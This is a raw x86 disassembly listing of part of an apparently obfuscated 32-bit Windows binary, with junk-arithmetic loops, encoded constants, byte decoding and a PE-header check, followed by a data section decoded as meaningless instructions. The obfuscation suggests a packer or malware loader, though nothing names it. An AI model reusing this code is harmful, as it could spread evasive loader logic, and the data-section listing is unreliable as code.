  424824:	mov    ecx,DWORD PTR [ebp+0x8]
  424827:	mov    eax,0x8a36
  42482c:	or     DWORD PTR ds:0x42a3b9,0x12b4
  424836:	xor    ax,WORD PTR [ecx+0x20]
  42483a:	xor    DWORD PTR ds:0x42a335,edx
  424840:	mov    ecx,0x3afc
  424845:	add    ax,cx
  424848:	movzx  eax,ax
  42484b:	mov    DWORD PTR ds:0x42a2ed,0x18
  424855:	cmp    DWORD PTR ds:0x42a2ed,0x0
  42485c:	je     0x424893
  424862:	cmp    DWORD PTR ds:0x42a2ed,0x1d
  424869:	jne    0x42487f
  42486f:	push   0x787d
  424874:	push   0x3e83
  424879:	call   DWORD PTR ds:0x425214
  42487f:	xor    ecx,ecx
  424881:	xor    ecx,DWORD PTR ds:0x42a2ed
  424887:	dec    ecx
  424888:	mov    DWORD PTR ds:0x42a2ed,ecx
  42488e:	jmp    0x424855
  424893:	mov    DWORD PTR [ebp-0xc],eax
  424896:	sbb    DWORD PTR ds:0x42a3c9,edi
  42489c:	mov    BYTE PTR [ebp-0x1],0x7f
  4248a0:	xor    ecx,ecx
  4248a2:	xor    ecx,DWORD PTR ds:0x42a3fd
  4248a8:	sub    DWORD PTR ds:0x42a2fd,ecx
  4248ae:	lea    eax,[ebp-0x1]
  4248b1:	dec    ecx
  4248b2:	mov    DWORD PTR [ebp-0x10],eax
  4248b5:	adc    DWORD PTR ds:0x42a2e5,ebx
  4248bb:	mov    al,BYTE PTR [ebp-0x1]
  4248be:	mov    ecx,DWORD PTR [ebp-0x10]
  4248c1:	xor    al,0x43
  4248c3:	sbb    DWORD PTR ds:0x42a3f5,0x194f
  4248cd:	sub    al,0x3b
  4248cf:	mov    BYTE PTR [ecx],al
  4248d1:	and    DWORD PTR ds:0x42a3cd,0x0
  4248db:	jmp    0x4248ed
  4248e0:	mov    ecx,DWORD PTR ds:0x42a3cd
  4248e6:	inc    ecx
  4248e7:	mov    DWORD PTR ds:0x42a3cd,ecx
  4248ed:	cmp    DWORD PTR ds:0x42a3cd,0x19
  4248f4:	jae    0x42496b
  4248fa:	cmp    DWORD PTR ds:0x42a3cd,0x1e
  424901:	jne    0x424917
  424907:	push   0x42a3f5
  42490c:	push   0x40f1
  424911:	call   DWORD PTR ds:0x425218
  424917:	jmp    0x4248e0
  42491c:	mov    DWORD PTR ds:0x42a3bd,0x14
  424926:	cmp    DWORD PTR ds:0x42a3bd,0x0
  42492d:	je     0x42496b
  424933:	cmp    DWORD PTR ds:0x42a3bd,0x23
  42493a:	jne    0x424959
  424940:	push   DWORD PTR [ebp-0x28]
  424943:	push   DWORD PTR [ebp-0x24]
  424946:	push   0x68e9
  42494b:	push   DWORD PTR [ebp-0x24]
  42494e:	push   0x1ab2
  424953:	call   DWORD PTR ds:0x425058
  424959:	mov    ecx,DWORD PTR ds:0x42a3bd
  42495f:	dec    ecx
  424960:	mov    DWORD PTR ds:0x42a3bd,ecx
  424966:	jmp    0x424926
  42496b:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  424972:	mov    DWORD PTR ds:0x42a2d9,0x1e
  42497c:	cmp    DWORD PTR ds:0x42a2d9,0x0
  424983:	je     0x4249d8
  424989:	cmp    DWORD PTR ds:0x42a2d9,0x6
  424990:	jne    0x4249aa
  424996:	push   DWORD PTR [ebp-0x24]
  424999:	push   DWORD PTR [ebp-0x24]
  42499c:	push   0x8937
  4249a1:	push   DWORD PTR [ebp-0x20]
  4249a4:	call   DWORD PTR ds:0x42505c
  4249aa:	cmp    DWORD PTR ds:0x42a2d9,0x7
  4249b1:	jne    0x4249c2
  4249b7:	mov    eax,ds:0x42a2d9
  4249bc:	dec    eax
  4249bd:	mov    ds:0x42a2d9,eax
  4249c2:	mov    eax,ds:0x42a2d9
  4249c7:	dec    eax
  4249c8:	mov    ds:0x42a2d9,eax
  4249cd:	jmp    0x42497c
  4249d2:	and    ecx,0x25f3
  4249d8:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  4249df:	adc    DWORD PTR ds:0x42a409,edi
  4249e5:	mov    eax,DWORD PTR [ebp-0x8]
  4249e8:	mov    ecx,0x7510850
  4249ed:	or     DWORD PTR ds:0x42a2e9,0x3433
  4249f7:	push   esi
  4249f8:	sbb    DWORD PTR ds:0x42a381,0x5e43
  424a02:	xor    eax,ecx
  424a04:	mov    esi,0x327298
  424a09:	add    eax,esi
  424a0b:	mov    DWORD PTR ds:0x42a3c5,0x5140
  424a15:	jmp    0x424a36
  424a1a:	mov    dl,BYTE PTR [ebp-0x1]
  424a1d:	mov    DWORD PTR ds:0x42a3f1,0x4584
  424a27:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  424a2b:	mov    DWORD PTR ds:0x42a401,0x1056
  424a35:	inc    eax
  424a36:	cmp    eax,0x40
  424a39:	jb     0x424a1a
  424a3f:	mov    edx,DWORD PTR [ebp-0x8]
  424a42:	mov    eax,DWORD PTR [ebp-0xc]
  424a45:	xor    edx,ecx
  424a47:	add    edx,esi
  424a49:	cmp    edx,eax
  424a4b:	je     0x424a91
  424a51:	push   ebx
  424a52:	push   edi
  424a53:	mov    edi,DWORD PTR [ebp+0x8]
  424a56:	mov    eax,0x8a36
  424a5b:	xor    ax,WORD PTR [edi+edx*4+0x2]
  424a60:	mov    edi,0x3afc
  424a65:	add    ax,di
  424a68:	movzx  eax,ax
  424a6b:	mov    DWORD PTR [ebp-0x14],eax
  424a6e:	mov    eax,DWORD PTR [ebp+0x8]
  424a71:	movzx  eax,WORD PTR [eax+edx*4]
  424a75:	xor    eax,0x8a36
  424a7a:	add    eax,edi
  424a7c:	mov    edi,DWORD PTR [ebp-0x14]
  424a7f:	mov    BYTE PTR [ebp+edi*1-0x58],al
  424a83:	mov    eax,DWORD PTR [ebp-0xc]
  424a86:	inc    edx
  424a87:	cmp    edx,eax
  424a89:	jne    0x424a53
  424a8f:	pop    edi
  424a90:	pop    ebx
  424a91:	mov    eax,DWORD PTR [ebp-0x8]
  424a94:	mov    edx,DWORD PTR [ebp+0x10]
  424a97:	xor    eax,ecx
  424a99:	add    eax,esi
  424a9b:	mov    DWORD PTR [edx],eax
  424a9d:	mov    eax,DWORD PTR [ebp-0x8]
  424aa0:	xor    eax,ecx
  424aa2:	add    eax,esi
  424aa4:	mov    DWORD PTR [ebp+0x8],eax
  424aa7:	mov    eax,DWORD PTR [ebp+0x8]
  424aaa:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  424aae:	mov    dl,BYTE PTR [ebp-0x1]
  424ab1:	cmp    al,dl
  424ab3:	je     0x424af6
  424ab9:	mov    eax,DWORD PTR [ebp+0x8]
  424abc:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  424ac0:	mov    edx,DWORD PTR [ebp+0xc]
  424ac3:	cmp    al,BYTE PTR [edx]
  424ac5:	jne    0x424b1c
  424acb:	mov    eax,DWORD PTR [ebp-0x8]
  424ace:	mov    edx,DWORD PTR [ebp+0xc]
  424ad1:	movsx  edx,BYTE PTR [edx]
  424ad4:	xor    eax,ecx
  424ad6:	add    eax,esi
  424ad8:	cmp    edx,eax
  424ada:	je     0x424b10
  424ae0:	mov    DWORD PTR [ebp-0x18],0x705fd8e
  424ae7:	lea    eax,[ebp-0x18]
  424aea:	mov    DWORD PTR [ebp-0x14],eax
  424aed:	mov    eax,DWORD PTR [ebp-0x14]
  424af0:	add    DWORD PTR [eax],0x705fa8e
  424af6:	mov    eax,DWORD PTR [ebp-0x10]
  424af9:	mov    edx,DWORD PTR [ebp+0x8]
  424afc:	xor    eax,ecx
  424afe:	lea    eax,[eax+edx*1+0x327298]
  424b05:	mov    DWORD PTR [ebp+0x8],eax
  424b08:	inc    DWORD PTR [ebp+0xc]
  424b0b:	jmp    0x424aa7
  424b10:	mov    eax,DWORD PTR [ebp-0x10]
  424b13:	xor    eax,ecx
  424b15:	mov    ecx,DWORD PTR [ebp+0x10]
  424b18:	add    eax,esi
  424b1a:	mov    DWORD PTR [ecx],eax
  424b1c:	pop    esi
  424b1d:	leave  
  424b1e:	ret    0xc
  424b21:	push   ebp
  424b22:	mov    ebp,esp
  424b24:	push   ecx
  424b25:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  424b2c:	mov    eax,DWORD PTR [ebp+0x8]
  424b2f:	mov    al,BYTE PTR [eax]
  424b31:	add    al,0x3b
  424b33:	xor    al,0x43
  424b35:	mov    DWORD PTR ds:0x42a301,0x5cec
  424b3f:	cmp    al,0xcb
  424b41:	jne    0x424bf3
  424b47:	add    ecx,DWORD PTR ds:0x42a339
  424b4d:	mov    eax,DWORD PTR [ebp+0x8]
  424b50:	mov    DWORD PTR ds:0x42a349,0x1d
  424b5a:	cmp    DWORD PTR ds:0x42a349,0x0
  424b61:	je     0x424bab
  424b67:	cmp    DWORD PTR ds:0x42a349,0xf
  424b6e:	jne    0x424b7f
  424b74:	push   0x29e2
  424b79:	call   DWORD PTR ds:0x425060
  424b7f:	cmp    DWORD PTR ds:0x42a349,0x10
  424b86:	jne    0x424b99
  424b8c:	mov    edx,DWORD PTR ds:0x42a349
  424b92:	dec    edx
  424b93:	mov    DWORD PTR ds:0x42a349,edx
  424b99:	mov    edx,DWORD PTR ds:0x42a349
  424b9f:	dec    edx
  424ba0:	mov    DWORD PTR ds:0x42a349,edx
  424ba6:	jmp    0x424b5a
  424bab:	mov    ecx,DWORD PTR [ebp+0x8]
  424bae:	sbb    DWORD PTR ds:0x42a3f1,edx
  424bb4:	add    ecx,DWORD PTR [eax+0x3c]
  424bb7:	mov    edx,0x7510850
  424bbc:	add    eax,DWORD PTR ds:0x42a331
  424bc2:	mov    DWORD PTR [ebp+0x8],ecx
  424bc5:	mov    eax,DWORD PTR [ebp-0x4]
  424bc8:	xor    eax,edx
  424bca:	push   esi
  424bcb:	mov    esi,DWORD PTR [ebp+0x8]
  424bce:	mov    ecx,0x327298
  424bd3:	add    eax,ecx
  424bd5:	cmp    DWORD PTR [esi+0x54],eax
  424bd8:	pop    esi
  424bd9:	je     0x424be7
  424bdf:	mov    eax,DWORD PTR [ebp+0x8]
  424be2:	jmp    0x424c00
  424be7:	mov    eax,DWORD PTR [ebp-0x4]
  424bea:	xor    eax,edx
  424bec:	add    eax,ecx
  424bee:	jmp    0x424c00
  424bf3:	mov    eax,DWORD PTR [ebp-0x4]
  424bf6:	xor    eax,0x7510850
  424bfb:	add    eax,0x327298
  424c00:	leave  
  424c01:	ret    0x4

Disassembly of section .data:

00425000 <.data>:
  425000:	js     0x42505b
  425002:	add    al,BYTE PTR [eax]
  425004:	nop
  425005:	pop    ecx
  425006:	add    al,BYTE PTR [eax]
  425008:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425009:	pop    ecx
  42500a:	add    al,BYTE PTR [eax]
  42500c:	mov    dh,0x59
  42500e:	add    al,BYTE PTR [eax]
  425010:	retf   0x259
  425013:	add    al,ah
  425015:	pop    ecx
  425016:	add    al,BYTE PTR [eax]
  425018:	add    BYTE PTR [eax],al
  42501a:	add    BYTE PTR [eax],al
  42501c:	or     bl,BYTE PTR [edx+0x2]
  42501f:	add    BYTE PTR [eax],bl
  425021:	pop    edx
  425022:	add    al,BYTE PTR [eax]
  425024:	and    al,0x5a
  425026:	add    al,BYTE PTR [eax]
  425028:	xor    bl,BYTE PTR [edx+0x2]
  42502b:	add    BYTE PTR [esi],bh
  42502d:	pop    edx
  42502e:	add    al,BYTE PTR [eax]
  425030:	dec    esp
  425031:	pop    edx
  425032:	add    al,BYTE PTR [eax]
  425034:	pop    esi
  425035:	pop    edx
  425036:	add    al,BYTE PTR [eax]
  425038:	outs   dx,BYTE PTR ds:[esi]
  425039:	pop    edx
  42503a:	add    al,BYTE PTR [eax]
  42503c:	sbb    BYTE PTR [edx+0x2],0x0
  425040:	mov    WORD PTR [edx+0x2],ds
  425043:	add    BYTE PTR [eax-0x55fffda6],bl
  425049:	pop    edx
  42504a:	add    al,BYTE PTR [eax]
  42504c:	mov    dh,0x5a
  42504e:	add    al,BYTE PTR [eax]
  425050:	retf   0x25a
  425053:	add    dl,bl
  425055:	pop    edx
  425056:	add    al,BYTE PTR [eax]
  425058:	call   0xf64252b7
  42505d:	pop    edx
  42505e:	add    al,BYTE PTR [eax]
  425060:	add    bl,BYTE PTR [ebx+0x2]
  425063:	add    BYTE PTR [eax],dl
  425065:	pop    ebx
  425066:	add    al,BYTE PTR [eax]
  425068:	push   ds
  425069:	pop    ebx
  42506a:	add    al,BYTE PTR [eax]
  42506c:	sub    bl,BYTE PTR [ebx+0x2]
  42506f:	add    BYTE PTR [edx],bh
  425071:	pop    ebx
  425072:	add    al,BYTE PTR [eax]
  425074:	dec    eax
  425075:	pop    ebx
  425076:	add    al,BYTE PTR [eax]
  425078:	push   esp
  425079:	pop    ebx
  42507a:	add    al,BYTE PTR [eax]
  42507c:	pusha  
  42507d:	pop    ebx
  42507e:	add    al,BYTE PTR [eax]
  425080:	jo     0x4250dd
  425082:	add    al,BYTE PTR [eax]
  425084:	sbb    BYTE PTR [ebx+0x2],0x0
  425088:	xchg   edx,eax
  425089:	pop    ebx
  42508a:	add    al,BYTE PTR [eax]
  42508c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42508d:	pop    ebx
  42508e:	add    al,BYTE PTR [eax]
  425090:	mov    eax,0xc800025b
  425095:	pop    ebx
  425096:	add    al,BYTE PTR [eax]
  425098:	aam    0x5b
  42509a:	add    al,BYTE PTR [eax]
  42509c:	out    0x5b,al
  42509e:	add    al,BYTE PTR [eax]
  4250a0:	repnz pop ebx
  4250a2:	add    al,BYTE PTR [eax]
  4250a4:	(bad)  
  4250a5:	pop    ebx
  4250a6:	add    al,BYTE PTR [eax]
  4250a8:	push   cs
  4250a9:	pop    esp
  4250aa:	add    al,BYTE PTR [eax]
  4250ac:	sbb    al,0x5c
  4250ae:	add    al,BYTE PTR [eax]
  4250b0:	cs pop esp
  4250b2:	add    al,BYTE PTR [eax]
  4250b4:	ds pop esp
  4250b6:	add    al,BYTE PTR [eax]
  4250b8:	dec    esi
  4250b9:	pop    esp
  4250ba:	add    al,BYTE PTR [eax]
  4250bc:	pusha  
  4250bd:	pop    esp
  4250be:	add    al,BYTE PTR [eax]
  4250c0:	ins    BYTE PTR es:[edi],dx
  4250c1:	pop    esp
  4250c2:	add    al,BYTE PTR [eax]
  4250c4:	xchg   BYTE PTR [edx+eax*1+0x0],bl
  4250c8:	xchg   esi,eax
  4250c9:	pop    esp
  4250ca:	add    al,BYTE PTR [eax]
  4250cc:	scas   al,BYTE PTR es:[edi]
  4250cd:	pop    esp
  4250ce:	add    al,BYTE PTR [eax]
  4250d0:	ret    0x25c
  4250d3:	add    al,dl
  4250d5:	pop    esp
  4250d6:	add    al,BYTE PTR [eax]
  4250d8:	loop   0x425136
  4250da:	add    al,BYTE PTR [eax]
  4250dc:	neg    BYTE PTR [edx+eax*1+0x0]
  4250e0:	or     bl,BYTE PTR [ebp+0x2]
  4250e3:	add    BYTE PTR [ebx*2+0x5d2a0002],bl
  4250ea:	add    al,BYTE PTR [eax]
  4250ec:	cmp    al,0x5d
  4250ee:	add    al,BYTE PTR [eax]
  4250f0:	dec    edx
  4250f1:	pop    ebp
  4250f2:	add    al,BYTE PTR [eax]
  4250f4:	pop    edx
  4250f5:	pop    ebp
  4250f6:	add    al,BYTE PTR [eax]
  4250f8:	outs   dx,BYTE PTR ds:[esi]
  4250f9:	pop    ebp
  4250fa:	add    al,BYTE PTR [eax]
  4250fc:	test   BYTE PTR [ebp+0x2],bl
  4250ff:	add    BYTE PTR [esi-0x5bfffda3],dl
  425105:	pop    ebp
  425106:	add    al,BYTE PTR [eax]
  425108:	mov    ah,0x5d
  42510a:	add    al,BYTE PTR [eax]
  42510c:	ret    0x25d
  42510f:	add    al,ah
  425111:	pop    ebp
  425112:	add    al,BYTE PTR [eax]
  425114:	out    dx,al
  425115:	pop    ebp
  425116:	add    al,BYTE PTR [eax]
  425118:	cli    
  425119:	pop    ebp
  42511a:	add    al,BYTE PTR [eax]
  42511c:	or     al,0x5e
  42511e:	add    al,BYTE PTR [eax]
  425120:	sbb    bl,BYTE PTR [esi+0x2]
  425123:	add    BYTE PTR [esi],ah
  425125:	pop    esi
  425126:	add    al,BYTE PTR [eax]
  425128:	ds pop esi
  42512a:	add    al,BYTE PTR [eax]
  42512c:	dec    esi
  42512d:	pop    esi
  42512e:	add    al,BYTE PTR [eax]
  425130:	pop    edx
  425131:	pop    esi
  425132:	add    al,BYTE PTR [eax]
  425134:	push   0x5e
  425136:	add    al,BYTE PTR [eax]
  425138:	test   BYTE PTR [esi+0x2],bl
  42513b:	add    BYTE PTR [edx-0x57fffda2],bl
  425141:	pop    esi
  425142:	add    al,BYTE PTR [eax]
  425144:	mov    edx,0xd200025e
  425149:	pop    esi
  42514a:	add    al,BYTE PTR [eax]
  42514c:	loop   0x4251ac
  42514e:	add    al,BYTE PTR [eax]
  425150:	lock pop esi
  425152:	add    al,BYTE PTR [eax]
  425154:	or     bl,BYTE PTR [edi+0x2]
  425157:	add    BYTE PTR [edx],bl
  425159:	pop    edi
  42515a:	add    al,BYTE PTR [eax]
  42515c:	cs pop edi
  42515e:	add    al,BYTE PTR [eax]
  425160:	cmp    bl,BYTE PTR [edi+0x2]
  425163:	add    BYTE PTR [edx+0x5f],cl
  425166:	add    al,BYTE PTR [eax]
  425168:	pop    edx
  425169:	pop    edi
  42516a:	add    al,BYTE PTR [eax]
  42516c:	push   0x5f
  42516e:	add    al,BYTE PTR [eax]
  425170:	sbb    BYTE PTR [edi+0x2],0x0
  425174:	xchg   edx,eax
  425175:	pop    edi
  425176:	add    al,BYTE PTR [eax]
  425178:	test   al,0x5f
  42517a:	add    al,BYTE PTR [eax]
  42517c:	mov    ah,0x5f
  42517e:	add    al,BYTE PTR [eax]
  425180:	les    ebx,FWORD PTR [edi+0x2]
  425183:	add    dl,dl
  425185:	pop    edi
  425186:	add    al,BYTE PTR [eax]
  425188:	loopne 0x4251e9
  42518a:	add    al,BYTE PTR [eax]
  42518c:	repnz pop edi
  42518e:	add    al,BYTE PTR [eax]
  425190:	push   es
  425191:	pusha  
  425192:	add    al,BYTE PTR [eax]
  425194:	push   ss
  425195:	pusha  
  425196:	add    al,BYTE PTR [eax]
  425198:	sub    BYTE PTR [eax+0x2],ah
  42519b:	add    BYTE PTR [eax+eiz*2],dh
  42519e:	add    al,BYTE PTR [eax]
  4251a0:	inc    esp
  4251a1:	pusha  
  4251a2:	add    al,BYTE PTR [eax]
  4251a4:	push   esp
  4251a5:	pusha  
  4251a6:	add    al,BYTE PTR [eax]
  4251a8:	jo     0x42520a
  4251aa:	add    al,BYTE PTR [eax]
  4251ac:	test   BYTE PTR [eax+0x2],ah
  4251af:	add    BYTE PTR [edx-0x53fffda0],dl
  4251b5:	pusha  
  4251b6:	add    al,BYTE PTR [eax]
  4251b8:	mov    edx,0xce000260
  4251bd:	pusha  
  4251be:	add    al,BYTE PTR [eax]
  4251c0:	fisub  WORD PTR [eax+0x2]
  4251c3:	add    ah,ch
  4251c5:	pusha  
  4251c6:	add    al,BYTE PTR [eax]
  4251c8:	add    BYTE PTR [eax],al
  4251ca:	add    BYTE PTR [eax],al
  4251cc:	or     al,0x61
  4251ce:	add    al,BYTE PTR [eax]
  4251d0:	sbb    ah,BYTE PTR [ecx+0x2]
  4251d3:	add    BYTE PTR [ecx+eiz*2],ch
  4251d6:	add    al,BYTE PTR [eax]
  4251d8:	inc    eax
  4251d9:	popa   
  4251da:	add    al,BYTE PTR [eax]
  4251dc:	push   edx
  4251dd:	popa   
  4251de:	add    al,BYTE PTR [eax]
  4251e0:	pusha  
  4251e1:	popa   
  4251e2:	add    al,BYTE PTR [eax]
  4251e4:	js     0x425247
  4251e6:	add    al,BYTE PTR [eax]
  4251e8:	nop
  4251e9:	popa   
  4251ea:	add    al,BYTE PTR [eax]
  4251ec:	mov    al,ds:0xb0000261
  4251f1:	popa   
  4251f2:	add    al,BYTE PTR [eax]
  4251f4:	ret    0x261
  4251f7:	add    al,bl
  4251f9:	popa   
  4251fa:	add    al,BYTE PTR [eax]
  4251fc:	in     al,0x61
  4251fe:	add    al,BYTE PTR [eax]
  425200:	(bad)  
  425201:	popa   
  425202:	add    al,BYTE PTR [eax]
  425204:	sbb    ah,BYTE PTR [edx+0x2]
  425207:	add    BYTE PTR [edx+eiz*2],ah
  42520a:	add    al,BYTE PTR [eax]
  42520c:	cmp    BYTE PTR [edx+0x2],ah
  42520f:	add    BYTE PTR [esi+0x62],cl
  425212:	add    al,BYTE PTR [eax]
  425214:	pusha  
  425215:	bound  eax,QWORD PTR [edx]
  425217:	add    BYTE PTR [edx+eiz*2+0x2],dh
  42521b:	add    BYTE PTR [edx-0x6bfffd9e],al
  425221:	bound  eax,QWORD PTR [edx]
  425223:	add    BYTE PTR [eax-0x4bfffd9e],ch
  425229:	bound  eax,QWORD PTR [edx]
  42522b:	add    dl,al
  42522d:	bound  eax,QWORD PTR [edx]
  42522f:	add    dl,dl
  425231:	bound  eax,QWORD PTR [edx]
  425233:	add    dl,ah
  425235:	bound  eax,QWORD PTR [edx]
  425237:	add    al,bh
  425239:	bound  eax,QWORD PTR [edx]
  42523b:	add    BYTE PTR [esi],al
  42523d:	arpl   WORD PTR [edx],ax
  42523f:	add    BYTE PTR [esi],dl
  425241:	arpl   WORD PTR [edx],ax
  425243:	add    BYTE PTR [eax],ch
  425245:	arpl   WORD PTR [edx],ax
  425247:	add    BYTE PTR [edx],bh
  425249:	arpl   WORD PTR [edx],ax
  42524b:	add    BYTE PTR [esi+0x63],al
  42524e:	add    al,BYTE PTR [eax]
  425250:	push   edx
  425251:	arpl   WORD PTR [edx],ax
  425253:	add    BYTE PTR [ebx+eiz*2+0x2],ah
  425257:	add    BYTE PTR [ebx+eiz*2+0x639a0002],al
  42525e:	add    al,BYTE PTR [eax]
  425260:	mov    al,0x63
  425262:	add    al,BYTE PTR [eax]
  425264:	les    esp,FWORD PTR [ebx+0x2]
  425267:	add    dh,dl
  425269:	arpl   WORD PTR [edx],ax
  42526b:	add    al,ch
  42526d:	arpl   WORD PTR [edx],ax
  42526f:	add    al,bh
  425271:	arpl   WORD PTR [edx],ax
  425273:	add    BYTE PTR [eax],cl
  425275:	add    al,BYTE PTR fs:[eax]
  425278:	sbb    BYTE PTR [edx+eax*1+0x0],ah
  42527c:	sub    BYTE PTR [edx+eax*1+0x0],ah
  425280:	cmp    al,0x64
  425282:	add    al,BYTE PTR [eax]
  425284:	dec    edx
  425285:	add    al,BYTE PTR fs:[eax]
  425288:	push   0x78000264
  42528d:	add    al,BYTE PTR fs:[eax]
  425290:	test   BYTE PTR [edx+eax*1+0x0],ah
  425294:	add    BYTE PTR [eax],al
  425296:	add    BYTE PTR [eax],al
  425298:	test   al,0x64
  42529a:	add    al,BYTE PTR [eax]
  42529c:	mov    dh,0x64
  42529e:	add    al,BYTE PTR [eax]
  4252a0:	ret    0x264
  4252a3:	add    dl,cl
  4252a5:	add    al,BYTE PTR fs:[eax]
  4252a8:	aam    0x64
  4252aa:	add    al,BYTE PTR [eax]
  4252ac:	out    0x64,al
  4252ae:	add    al,BYTE PTR [eax]
  4252b0:	hlt    
  4252b1:	add    al,BYTE PTR fs:[eax]
  4252b4:	(bad)  
  4252b5:	add    al,BYTE PTR fs:[eax]
  4252b8:	or     BYTE PTR [ebp+0x2],ah
  4252bb:	add    BYTE PTR [edx],dl
  4252bd:	add    al,BYTE PTR gs:[eax]
  4252c0:	and    ah,BYTE PTR [ebp+0x2]
  4252c3:	add    BYTE PTR [eax],dh
  4252c5:	add    al,BYTE PTR gs:[eax]
  4252c8:	cmp    al,0x65
  4252ca:	add    al,BYTE PTR [eax]
  4252cc:	inc    esi
  4252cd:	add    al,BYTE PTR gs:[eax]
  4252d0:	push   esp
  4252d1:	add    al,BYTE PTR gs:[eax]
  4252d4:	pop    esp
  4252d5:	add    al,BYTE PTR gs:[eax]
  4252d8:	data16 add al,BYTE PTR gs:[eax]
  4252dc:	jo     0x425343
  4252de:	add    al,BYTE PTR [eax]
  4252e0:	jl     0x425347
  4252e2:	add    al,BYTE PTR [eax]
  4252e4:	test   BYTE PTR [ebp+0x2],ah
  4252e7:	add    BYTE PTR [edx-0x63fffd9b],dl
  4252ed:	add    al,BYTE PTR gs:[eax]
  4252f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4252f1:	add    al,BYTE PTR gs:[eax]
  4252f4:	scas   al,BYTE PTR es:[edi]
  4252f5:	add    al,BYTE PTR gs:[eax]
  4252f8:	mov    eax,0xc2000265
  4252fd:	add    al,BYTE PTR gs:[eax]
  425300:	int3   
  425301:	add    al,BYTE PTR gs:[eax]
  425304:	aam    0x65
  425306:	add    al,BYTE PTR [eax]
  425308:	call   0xf2425572
  42530d:	add    al,BYTE PTR gs:[eax]
  425310:	cld    
  425311:	add    al,BYTE PTR gs:[eax]
  425314:	push   es
  425315:	data16 add al,BYTE PTR [eax]
  425318:	push   cs
  425319:	data16 add al,BYTE PTR [eax]
  42531c:	push   ss
  42531d:	data16 add al,BYTE PTR [eax]
  425320:	and    BYTE PTR [esi+0x2],ah
  425323:	add    BYTE PTR [edx],ch
  425325:	data16 add al,BYTE PTR [eax]
  425328:	xor    al,0x66
  42532a:	add    al,BYTE PTR [eax]
  42532c:	inc    eax
  42532d:	data16 add al,BYTE PTR [eax]
  425330:	dec    esp
  425331:	data16 add al,BYTE PTR [eax]
  425334:	push   esi
  425335:	data16 add al,BYTE PTR [eax]
  425338:	pop    esi
  425339:	data16 add al,BYTE PTR [eax]
  42533c:	outs   dx,BYTE PTR ds:[esi]
  42533d:	data16 add al,BYTE PTR [eax]
  425340:	js     0x4253a8
  425342:	add    al,BYTE PTR [eax]
  425344:	and    BYTE PTR [esi+0x2],0x0
  425348:	add    BYTE PTR [eax],al
  42534a:	add    BYTE PTR [eax],al
  42534c:	call   0x266:0xaa000266
  425353:	add    al,al
  425355:	data16 add al,BYTE PTR [eax]
  425358:	aam    0x66
  42535a:	add    al,BYTE PTR [eax]
  42535c:	loopne 0x4253c4
  42535e:	add    al,BYTE PTR [eax]
  425360:	lock data16 add al,BYTE PTR [eax]
  425364:	add    al,0x67
  425366:	add    al,BYTE PTR [eax]
  425368:	sbb    ah,BYTE PTR [edi+0x2]
  42536b:	add    BYTE PTR [edx],ch
  42536d:	add    al,BYTE PTR [bx+si]
  425370:	xor    al,0x67
  425372:	add    al,BYTE PTR [eax]
  425374:	inc    esi
  425375:	add    al,BYTE PTR [bx+si]
  425378:	push   eax
  425379:	add    al,BYTE PTR [bx+si]
  42537c:	data16 add al,BYTE PTR [bx+si]
  425380:	jb     0x4253e9
  425382:	add    al,BYTE PTR [eax]
  425384:	jl     0x4253ed
  425386:	add    al,BYTE PTR [eax]
  425388:	xchg   BYTE PTR [edi+0x2],ah
  42538b:	add    BYTE PTR [eax-0x5bfffd99],bl
  425391:	add    al,BYTE PTR [bx+si]
  425394:	mov    eax,0xc8000267
  425399:	add    al,BYTE PTR [bx+si]
  42539c:	(bad)  
  42539d:	add    al,BYTE PTR [bx+si]
  4253a0:	jmp    0x267:0xf6000267
  4253a7:	add    BYTE PTR [edx],cl
  4253a9:	push   0x68140002
  4253ae:	add    al,BYTE PTR [eax]
  4253b0:	and    ch,BYTE PTR [eax+0x2]
  4253b3:	add    BYTE PTR [eax+ebp*2],ch
  4253b6:	add    al,BYTE PTR [eax]
  4253b8:	cmp    BYTE PTR [eax+0x2],ch
  4253bb:	add    BYTE PTR [eax+ebp*2+0x2],cl
  4253bf:	add    BYTE PTR [esi+0x68],dl
  4253c2:	add    al,BYTE PTR [eax]
  4253c4:	ins    BYTE PTR es:[edi],dx
  4253c5:	push   0x68780002
  4253ca:	add    al,BYTE PTR [eax]
  4253cc:	mov    BYTE PTR [eax+0x2],ch
  4253cf:	add    BYTE PTR [edx-0x57fffd98],bl
  4253d5:	push   0x68b80002
  4253da:	add    al,BYTE PTR [eax]
  4253dc:	les    ebp,FWORD PTR [eax+0x2]
  4253df:	add    al,dl
  4253e1:	push   0x68e40002
  4253e6:	add    al,BYTE PTR [eax]
  4253e8:	out    dx,al
  4253e9:	push   0x69060002
  4253ee:	add    al,BYTE PTR [eax]
  4253f0:	push   ds
  4253f1:	imul   eax,DWORD PTR [edx],0x2692a00
  4253f7:	add    BYTE PTR [edx],bh
  4253f9:	imul   eax,DWORD PTR [edx],0x0
  4253ff:	add    BYTE PTR [eax],al
  425401:	add    BYTE PTR [eax],al
  425403:	add    BYTE PTR ds:0x4d213c,ah
  425409:	add    BYTE PTR [eax],al
  42540b:	add    BYTE PTR [edx],al
  42540d:	add    BYTE PTR [eax],al
  42540f:	add    BYTE PTR [eax+0x0],cl
  425412:	add    BYTE PTR [eax],al
  425414:	xchg   edx,eax
  425415:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425416:	add    al,BYTE PTR [eax]
  425418:	xchg   edx,eax
  425419:	cwde   
  42541a:	add    al,BYTE PTR [eax]
  42541c:	add    BYTE PTR [eax],al
  42541e:	add    BYTE PTR [eax],al
  425420:	dec    esp
  425421:	ins    BYTE PTR es:[edi],dx
  425422:	pop    edx
  425423:	push   ecx
  425424:	imul   ebx,DWORD PTR [edx+0x59],0x74
  425428:	arpl   WORD PTR [ebp+0x7a],dx
  42542b:	ja     0x425474
  42542d:	jp     0x42547e
  42542f:	gs dec ebx
  425431:	dec    ebp
  425432:	je     0x4254a3
  425434:	ja     0x42549f
  425436:	popa   
  425437:	push   edi
  425438:	jno    0x42548b
  42543a:	jae    0x4254a3
  42543c:	dec    ebx
  42543d:	dec    esp
  42543e:	jae    0x4254ba
  425440:	dec    ebp
  425441:	push   ebx
  425442:	push   eax
